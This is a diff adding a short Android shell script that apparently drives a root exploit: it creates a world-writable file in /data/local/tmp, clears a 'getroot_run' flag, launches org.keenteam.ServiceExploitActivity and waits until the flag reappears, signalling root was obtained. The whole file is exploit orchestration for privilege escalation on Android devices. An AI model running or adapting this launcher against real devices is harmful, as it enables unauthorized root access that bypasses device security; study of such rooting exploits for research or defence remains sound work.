@@ -1,0 +1,7 @@
+#!/system/bin/sh
+
+touch /data/local/tmp/memfile
+chmod 777 /data/local/tmp/memfile
+rm -f /data/local/tmp/getroot_run
+am start -n org.keenteam/org.keenteam.ServiceExploitActivity
+while [ ! -f /data/local/tmp/getroot_run ]; do sleep 1; done
